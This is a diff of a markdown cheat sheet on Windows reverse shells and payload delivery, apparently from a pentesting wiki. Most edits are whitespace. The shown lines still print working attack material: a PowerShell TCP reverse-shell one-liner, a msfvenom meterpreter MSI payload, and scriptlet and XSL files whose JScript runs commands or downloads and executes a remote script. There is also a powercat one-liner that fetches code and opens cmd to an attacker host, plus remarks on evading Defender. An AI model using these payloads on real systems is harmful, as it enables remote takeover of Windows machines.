@@ -78,7 +78,7 @@ powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 Process performing network call: **svchost.exe**  
 Payload written on disk: **WebDAV client local cache**
 
-**One liner:** 
+**One liner:**
 
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
@@ -148,7 +148,7 @@ Payload written on disk: **WebDAV client local cache**
 </public>
 <script language="JScript">
 <![CDATA[
-	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ]]>
 </script>
 </scriptlet>
@@ -202,7 +202,7 @@ Payload written on disk: **IE local cache**
 </public>
 <script language="JScript">
 <![CDATA[
-	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ]]>
 </script>
 </scriptlet>
@@ -257,10 +257,10 @@ Payload written on disk: **WebDAV client local cache**
 <registration 
     progid="PoC"
     classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
-	<script language="JScript">
-		<![CDATA[
-			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");	
-		]]>
+    <script language="JScript">
+        <![CDATA[
+            var r = new ActiveXObject("WScript.Shell").Run("calc.exe");    
+        ]]>
 </script>
 </registration>
 </scriptlet>
@@ -336,7 +336,7 @@ impacket-smbserver -smb2support kali `pwd`
 Attacker
 
 ```text
-msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
 
@@ -363,11 +363,11 @@ Example xsl file:
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
 <output method="text"/>
-	<ms:script implements-prefix="user" language="JScript">
-		<![CDATA[
-			var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
-		]]>
-	</ms:script>
+    <ms:script implements-prefix="user" language="JScript">
+        <![CDATA[
+            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
+        ]]>
+    </ms:script>
 </stylesheet>
 ```
 
@@ -426,7 +426,7 @@ Payload written on disk: **WebDAV client local cache**
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 
- Process performing network call: **svchost.exe**  
+Process performing network call: **svchost.exe**  
 Payload written on disk: **WebDAV client local cache**
 
 **I haven't tried it**
@@ -461,7 +461,7 @@ Defender doesn't detect it as malicious code \(yet, 3/04/2019\).
 
 Download, start web server, star listener and execute in victim:
 
-```
+```text
  powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
 
@@ -524,8 +524,6 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 **Detected as malicious code**
 
-
-
 ## More
 
 [PS&gt;Attack](https://github.com/jaredhaight/PSAttack) PS console with some offensive PS modules preloaded \(cyphered\)  
@@ -534,17 +532,15 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive
 
 ## Bibliography
 
-{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}
+{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" caption="" %}
 
-{% embed url="https://gist.github.com/Arno0x" %}
+{% embed url="https://gist.github.com/Arno0x" caption="" %}
 
-{% embed url="https://github.com/GreatSCT/GreatSCT" %}
+{% embed url="https://github.com/GreatSCT/GreatSCT" caption="" %}
 
-{% embed url="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" %}
+{% embed url="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" caption="" %}
 
-{% embed url="https://www.hackingarticles.in/koadic-com-command-control-framework/" %}
+{% embed url="https://www.hackingarticles.in/koadic-com-command-control-framework/" caption="" %}
 
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}
-
-
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" caption="" %}
 
